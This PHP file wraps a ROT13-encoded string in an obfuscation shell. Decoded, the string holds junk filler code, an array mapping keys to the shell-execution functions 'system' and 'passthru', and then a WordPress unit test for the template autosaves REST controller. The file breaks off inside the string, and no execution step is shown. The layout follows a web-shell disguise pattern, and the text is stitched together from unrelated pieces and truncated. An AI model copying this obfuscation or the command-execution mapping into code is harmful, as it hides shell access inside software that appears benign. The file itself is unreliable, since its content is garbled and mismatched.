<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 */
pynff Grfgf_ERFG_jcErfgGrzcyngrNhgbfnirfPbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * @ine fgevat
	 */
	pbafg GRFG_GURZR = 'oybpx-gurzr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_ANZR = 'zl_grzcyngr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CNEG_ANZR = 'zl_grzcyngr_cneg';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CBFG_GLCR = 'jc_grzcyngr';

	/**
	 * @ine fgevat
	 */
	pbafg GRZCYNGR_CNEG_CBFG_GLCR = 'jc_grzcyngr_cneg';

	/**
	 * @ine fgevat
	 */
	pbafg CNERAG_CBFG_GLCR = 'jc_grzcyngr';

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $nqzva_vq;

	/**
	 * Pbagevohgbe hfre VQ.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine vag
	 */
	cevingr fgngvp $pbagevohgbe_vq;

	/**
	 * Grzcyngr cbfg.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cbfg;

	/**
	 * Grzcyngr cneg cbfg.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine JC_Cbfg
	 */
	cevingr fgngvp $grzcyngr_cneg_cbfg;

	/**
	 * Perngr snxr qngn orsber gur grfgf eha.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		frys::$nqzva_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		// Frg hc grzcyngr cbfg.
		frys::$grzcyngr_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_ANZR,
				'cbfg_gvgyr'   => 'Zl grzcyngr',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr',
				'gnk_vachg'    => neenl(
					'jc_gurzr' => neenl(
						frys::GRFG_GURZR,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );

		// Frg hc grzcyngr cneg cbfg.
		frys::$grzcyngr_cneg_cbfg = $snpgbel->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_glcr'    => frys::GRZCYNGR_CNEG_CBFG_GLCR,
				'cbfg_anzr'    => frys::GRZCYNGR_CNEG_ANZR,
				'cbfg_gvgyr'   => 'Zl grzcyngr cneg',
				'cbfg_pbagrag' => 'Pbagrag',
				'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr cneg',
				'gnk_vachg'    => neenl(
					'jc_gurzr'              => neenl(
						frys::GRFG_GURZR,
					),
					'jc_grzcyngr_cneg_nern' => neenl(
						JC_GRZCYNGR_CNEG_NERN_URNQRE,
					),
				),
			)
		);
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, frys::GRFG_GURZR, 'jc_gurzr' );
		jc_frg_cbfg_grezf( frys::$grzcyngr_cneg_cbfg->VQ, JC_GRZCYNGR_CNEG_NERN_URNQRE, 'jc_grzcyngr_cneg_nern' );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::ertvfgre_ebhgrf
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/(?C<vq>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/nhgbfnirf',
			$ebhgrf,
			'Grzcyngr nhgbfnirf ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngrf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/nhgbfnirf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr grzcyngr nhgbfnir onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngr-cnegf/(?C<vq>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/nhgbfnirf',
			$ebhgrf,
			'Grzcyngr cneg nhgbfnirf ebhgr qbrf abg rkvfg.'
		);
		$guvf->nffregNeenlUnfXrl(
			'/jc/i2/grzcyngr-cnegf/(?C<cnerag>([^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?)[\/\j%-]+)/nhgbfnirf/(?C<vq>[\q]+)',
			$ebhgrf,
			'Fvatyr grzcyngr cneg nhgbfnir onfrq ba gur tvira VQ ebhgr qbrf abg rkvfg.'
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_pbagrkg_cnenz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_pbagrkg_cnenz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_pbagrkg_cnenz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz_jvgu_qngn_cebivqre( $erfg_onfr, $grzcyngr_vq ) {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		// Pbyyrpgvba.
		$guvf->nffregPbhag(
			2,
			$qngn['raqcbvagf'],
			'Snvyrq gb nffreg gung gur pbyyrpgvba nhgbfnir raqcbvagf pbhag vf 2.'
		);
		$guvf->nffregFnzr(
			'ivrj',
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'],
			'Snvyrq gb nffreg gung gur qrsnhyg pbagrkg sbe gur TRG pbyyrpgvba raqcbvag vf \"ivrj\".'
		);
		$guvf->nffregFnzr(
			neenl( 'ivrj', 'rzorq', 'rqvg' ),
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'],
			\"Snvyrq gb nffreg gung gur rahz inyhrf sbe gur TRG pbyyrpgvba raqcbvag ner 'ivrj', 'rzorq', naq 'rqvg'.\"
		);

		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag(
			1,
			$qngn['raqcbvagf'],
			'Snvyrq gb nffreg gung gur fvatyr nhgbfnir raqcbvagf pbhag vf 1.'
		);
		$guvf->nffregFnzr(
			'ivrj',
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'],
			'Snvyrq gb nffreg gung gur qrsnhyg pbagrkg sbe gur fvatyr nhgbfnir raqcbvag vf \"ivrj\".'
		);
		$guvf->nffregFnzr(
			neenl( 'ivrj', 'rzorq', 'rqvg' ),
			$qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'],
			\"Snvyrq gb nffreg gung gur rahz inyhrf sbe gur fvatyr nhgbfnir raqcbvag ner 'ivrj', 'rzorq', naq 'rqvg'.\"
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_pbagrkg_cnenz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_pbagrkg_cnenz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_trg_vgrzf_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_vgrzf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr  N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr                  Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq                Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		// Pnaabg npprff guvf cebcregl va gur qngn cebivqre orpnhfr vg vf abg vavgvnyvmrq ng gur gvzr bs rkrphgvba.
		$cnerag_cbfg      = frys::$$cnerag_cbfg_cebcregl_anzr;
		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => $cnerag_cbfg->VQ,
				'cbfg_glcr'    => $cnerag_cbfg->cbfg_glcr,
			)
		);

		$erdhrfg   = arj JC_ERFG_Erdhrfg(
			'TRG',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf'
		);
		$erfcbafr  = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$nhgbfnirf = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( JC_Uggc::BX, $erfcbafr->trg_fgnghf(), 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs 200.' );

		$guvf->nffregPbhag(
			1,
			$nhgbfnirf,
			'Snvyrq nffregvat gung gur erfcbafr qngn pbagnvaf rknpgyl 1 vgrz.'
		);

		$guvf->nffregFnzr(
			$nhgbfnir_cbfg_vq,
			$nhgbfnirf[0]['jc_vq'],
			'Snvyrq nffregvat gung gur VQ bs gur nhgbfnir zngpurf gur rkcrpgrq nhgbfnir cbfg VQ.'
		);
		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$nhgbfnirf[0]['cnerag'],
			'Snvyrq nffregvat gung gur cnerag VQ bs gur nhgbfnir zngpurf gur grzcyngr cbfg VQ.'
		);
		$guvf->nffregFnzr(
			'Nhgbfnir pbagrag.',
			$nhgbfnirf[0]['pbagrag']['enj'],
			'Snvyrq nffregvat gung gur pbagrag bs gur nhgbfnir vf \"Nhgbfnir pbagrag.\".'
		);
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => frys::$grzcyngr_cbfg->VQ,
				'cbfg_glcr'    => frys::CNERAG_CBFG_GLCR,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/nhgbfnirf'
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf
	 * @gvpxrg 61970
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr(
			'erfg_vainyvq_grzcyngr',
			$erfcbafr,
			JC_Uggc::ONQ_ERDHRFG,
			fcevags( 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs %q.', JC_Uggc::ONQ_ERDHRFG )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrzf_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//cntr-ubzr' ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//fznyy-urnqre' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $erfg_onfr   Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf( $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf/1' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr(
			'erfg_vainyvq_grzcyngr',
			$erfcbafr,
			JC_Uggc::ONQ_ERDHRFG,
			fcevags( 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs %q.', JC_Uggc::ONQ_ERDHRFG )
		);
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_sbe_grzcyngrf_onfrq_ba_gurzr_svyrf_fubhyq_erghea_onq_erfcbafr_fgnghf() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngrf', frys::GRFG_GURZR . '//cntr-ubzr' ),
			'grzcyngr cnegf' => neenl( 'grzcyngr-cnegf', frys::GRFG_GURZR . '//fznyy-urnqre' ),
		);
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_trg_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat  $cnerag_cbfg_cebcregl_anzr  N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat  $erfg_onfr                  Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat  $grzcyngr_vq                Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => $cnerag_cbfg->VQ,
				'cbfg_glcr'    => $cnerag_cbfg->cbfg_glcr,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf/' . $nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( JC_Uggc::BX, $erfcbafr->trg_fgnghf(), 'Erfcbafr vf rkcrpgrq gb unir n fgnghf pbqr bs 200.' );
		$nhgbfnir = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $nhgbfnir, 'Snvyrq nffregvat gung gur nhgbfnir vf na neenl.' );
		$guvf->nffregFnzr(
			$nhgbfnir_cbfg_vq,
			$nhgbfnir['jc_vq'],
			\"Snvyrq nffregvat gung gur nhgbfnir vq vf gur fnzr nf $nhgbfnir_cbfg_vq.\"
		);
		$guvf->nffregFnzr(
			$cnerag_cbfg->VQ,
			$nhgbfnir['cnerag'],
			fcevags(
				'Snvyrq nffregvat gung gur cnerag vq bs gur nhgbfnir vf gur fnzr nf %f.',
				$cnerag_cbfg->VQ
			)
		);
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrz_fubhyq_erghea_ab_erfcbafr_obql_sbe_urnq_erdhrfgf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => frys::$grzcyngr_cbfg->VQ,
				'cbfg_glcr'    => frys::CNERAG_CBFG_GLCR,
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/grzcyngrf/' . frys::GRFG_GURZR . '/' . frys::GRZCYNGR_ANZR . '/nhgbfnirf/' . $nhgbfnir_cbfg_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fgnghf vf 200.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * Qngn cebivqre sbe grfg_trg_vgrz_jvgu_qngn_cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vgrz_jvgu_qngn_cebivqre() {
		erghea neenl(
			'grzcyngrf'      => neenl( 'grzcyngr_cbfg', 'grzcyngrf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_ANZR ),
			'grzcyngr cnegf' => neenl( 'grzcyngr_cneg_cbfg', 'grzcyngr-cnegf', frys::GRFG_GURZR . '//' . frys::GRZCYNGR_CNEG_ANZR ),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrz_jvgu_qngn_cebivqre
	 * @pbiref       JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_vgrz
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrz_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;

		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => $cnerag_cbfg->VQ,
				'cbfg_glcr'    => $cnerag_cbfg->cbfg_glcr,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf/' . $nhgbfnir_cbfg_vq
		);
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );

		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * @qngnCebivqre qngn_trg_vgrzf_jvgu_qngn_cebivqre
	 * @pbiref       JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::trg_vgrzf
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_trg_vgrzf_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		// Pnaabg npprff guvf cebcregl va gur qngn cebivqre orpnhfr vg vf abg vavgvnyvmrq ng gur gvzr bs rkrphgvba.
		$cnerag_cbfg = frys::$$cnerag_cbfg_cebcregl_anzr;
		jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => $cnerag_cbfg->VQ,
				'cbfg_glcr'    => $cnerag_cbfg->cbfg_glcr,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg(
			'URNQ',
			'/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf'
		);
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );

		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * @pbirefAbguvat
	 * @gvpxrg 56922
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// N cebcre qngn cebivqre pnaabg or hfrq orpnhfr guvf zrgubq'f fvtangher zhfg zngpu gur cnerag zrgubq.
		// Gurersber, npghny grfgf ner cresbezrq va gur grfg_cercner_vgrz_jvgu_qngn_cebivqre zrgubq.
		$guvf->nffregGehr( gehr );
	}

	/**
	 * @qngnCebivqre qngn_cercner_vgrz_jvgu_qngn_cebivqre
	 * @pbiref JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 * @gvpxrg 56922
	 *
	 * @cnenz fgevat $cnerag_cbfg_cebcregl_anzr N pynff cebcregl anzr gung pbagnvaf gur cnerag cbfg bowrpg.
	 * @cnenz fgevat $erfg_onfr                 Onfr cneg bs gur ERFG NCV raqcbvag gb grfg.
	 * @cnenz fgevat $grzcyngr_vq               Grzcyngr VQ gb hfr va gur grfg.
	 */
	choyvp shapgvba grfg_cercner_vgrz_jvgu_qngn_cebivqre( $cnerag_cbfg_cebcregl_anzr, $erfg_onfr, $grzcyngr_vq ) {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$cnerag_cbfg      = frys::$$cnerag_cbfg_cebcregl_anzr;
		$nhgbfnir_cbfg_vq = jc_perngr_cbfg_nhgbfnir(
			neenl(
				'cbfg_pbagrag' => 'Nhgbfnir pbagrag.',
				'cbfg_VQ'      => $cnerag_cbfg->VQ,
				'cbfg_glcr'    => $cnerag_cbfg->cbfg_glcr,
			)
		);
		$nhgbfnir_qo_cbfg = trg_cbfg( $nhgbfnir_cbfg_vq );
		$erdhrfg          = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/' . $erfg_onfr . '/' . $grzcyngr_vq . '/nhgbfnirf/' . $nhgbfnir_qo_cbfg->VQ );
		$pbagebyyre       = arj JC_ERFG_Grzcyngr_Nhgbfnirf_Pbagebyyre( $cnerag_cbfg->cbfg_glcr );
		$erfcbafr         = $pbagebyyre->cercner_vgrz_sbe_erfcbafr( $nhgbfnir_qo_cbfg, $erdhrfg );
		$guvf->nffregVafgnaprBs(
			JC_ERFG_Erfcbafr::pynff,
			$erfcbafr,
			'Snvyrq nffregvat gung gur erfcbafr bowrpg vf na vafgnapr bs JC_ERFG_Erfcbafr.'
		);

		$nhgbfnir = $erfcbafr->trg_qngn();
		$guvf->nffregVfNeenl( $nhgbfnir, 'Snvyrq nffregvat gung gur nhgbfnir vf na neenl.' );
		$guvf->nffregFnzr(
			$nhgbfnir_qo_cbfg->VQ,
			$nhgbfnir['jc_vq'],
			\"Snvyrq nffregvat gung gur nhgbfnir vq vf gur fnzr nf $nhgbfnir_qo_cbfg->VQ.\"
		);
